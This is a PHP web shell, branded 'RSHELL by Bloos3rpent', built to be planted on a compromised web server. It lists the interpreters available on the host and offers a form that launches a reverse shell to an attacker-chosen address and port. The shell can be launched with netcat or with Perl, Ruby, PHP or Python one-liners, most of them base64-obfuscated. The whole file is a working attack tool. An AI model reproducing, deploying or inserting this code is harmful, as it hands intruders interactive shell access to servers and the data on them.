<?php

echo '<center>
<pre>

 ______     ______     __  __     ______     __         __        
/\  == \   /\  ___\   /\ \_\ \   /\  ___\   /\ \       /\ \       
\ \  __<   \ \___  \  \ \  __ \  \ \  __\   \ \ \____  \ \ \____  
 \ \_\ \_\  \/\_____\  \ \_\ \_\  \ \_____\  \ \_____\  \ \_____\ 
  \/_/ /_/   \/_____/   \/_/\/_/   \/_____/   \/_____/   \/_____/ 
          
          by Bloos3rpent                                                         
</pre>
';

echo '<br>Useful: ( blank = not available)<br>
<b>Netcat: </b>'.shell_exec('which nc').'<br>
<b>Python 2.7: </b>'.shell_exec('which python').'<br>
<b>Perl: </b>'.shell_exec('which perl').'<br>
<b>Ruby: </b>'.shell_exec('which ruby').'<br>
<b>PHP: </b>'.shell_exec('which php').'<br>



';

echo '<form style="margin:10px;" method="POST" action=""><input style="margin:10px;" type="text" value="'.$_SERVER['REMOTE_ADDR'].'" name="addr" required>';
echo '<input type="text" value="1337" name="port" required>';
echo '
<select name="method" required>
    <option value="nc" selected>NetCat</option>
    <option value="perl">Perl</option>
    <option value="ruby" >Ruby</option>
    <option value="php" >PHP</option>
    <option value="python" >Python</option>
';
echo '<br><input type="submit" value=">>"></form>';




if (isset($_POST['addr']) && isset($_POST['port'])) {
echo 'DONE';

	echo '<pre><div class="query" style="width:70%;overflow:auto;">';
	switch ($_POST['method']) {
		case 'nc':
			$rshell = 'nc -e /bin/sh '.$_POST['addr'].' '.$_POST['port'];
			system($rshell);
			echo $rshell;
			break;

		case 'perl':
			$rshell = base64_decode('cGVybCAtZSAndXNlIFNvY2tldDskaT0i').$_POST['addr'].'";$p='.$_POST['port'].base64_decode('O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Oyc=');
			system($rshell);
			echo $rshell;
			break;

		case 'ruby':
			$rshell = base64_decode('cnVieSAtcnNvY2tldCAtZSdmPVRDUFNvY2tldC5vcGVuKCI=').$_POST['addr'].'",'.$_POST['port'].base64_decode('KS50b19pO2V4ZWMgc3ByaW50ZigiL2Jpbi9zaCAtaSA8JiVkID4mJWQgMj4mJWQiLGYsZixmKSc=');
			system($rshell);
			echo $rshell;
			break;

		case 'php':
			$rshell = base64_decode('cGhwIC1yICckc29jaz1mc29ja29wZW4oIg==').$_POST['addr'].'",'.$_POST['port'].base64_decode('KTtleGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc=');
			system($rshell);
			echo $rshell;
			break;

		case 'python':
			$rshell = base64_decode('cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgi').$_POST['addr'].'",'.$_POST['port'].base64_decode('KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn');
			system($rshell);
			echo $rshell;
			break;

		default:
			echo 'error';
			break;}
	}
else {}

echo '</div>'
?>
